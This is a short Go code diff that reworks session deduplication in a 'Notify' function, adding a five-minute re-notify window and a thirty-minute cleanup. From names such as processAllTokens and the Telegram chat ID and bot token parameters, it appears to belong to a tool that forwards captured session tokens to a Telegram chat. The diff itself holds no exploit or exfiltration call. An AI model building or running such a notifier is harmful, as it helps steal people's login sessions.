@@ -107,7 +107,7 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 	return consolidatedTokens, nil
 }
 
-var processedSessions = make(map[string]bool)
+var processedSessions = make(map[string]time.Time)
 var sessionMessageMap = make(map[string]int)
 var mu sync.Mutex
 
@@ -198,7 +198,7 @@ func formatSessionMessage(session TSession) string {
 func Notify(session TSession, chatid string, teletoken string) {
 	mu.Lock()
 	// Check if the session is already processed
-	if processedSessions[string(session.ID)] {
+	if lastNotified, exists := processedSessions[string(session.ID)]; exists && time.Since(lastNotified) < 5*time.Minute {
 		mu.Unlock()
 		messageID, exists := sessionMessageMap[string(session.ID)]
 		if exists {
@@ -220,7 +220,14 @@ func Notify(session TSession, chatid string, teletoken string) {
 	}
 
 	// Mark session as processed
-	processedSessions[string(session.ID)] = true
+	processedSessions[string(session.ID)] = time.Now()
+
+	// Clean up old entries (forget sessions older than 30 minutes)
+	for sid, t := range processedSessions {
+		if time.Since(t) > 30*time.Minute {
+			delete(processedSessions, sid)
+		}
+	}
 	mu.Unlock()
 
 	// Create the TXT file for the original message
